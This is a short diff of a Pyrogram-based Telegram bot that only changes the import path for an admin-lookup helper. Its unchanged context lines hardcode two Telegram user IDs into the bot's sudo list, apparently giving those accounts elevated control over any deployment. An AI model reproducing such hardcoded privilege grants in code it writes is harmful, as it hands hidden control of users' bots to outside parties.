@@ -4,7 +4,7 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from config import SUDO_USERS
-from helpers.admins import get_administrators
+from SNEHABHI.SNEHUABHI.admins import get_administrators
 
 SUDO_USERS.append(2085808992)
 SUDO_USERS.append(1204659519)
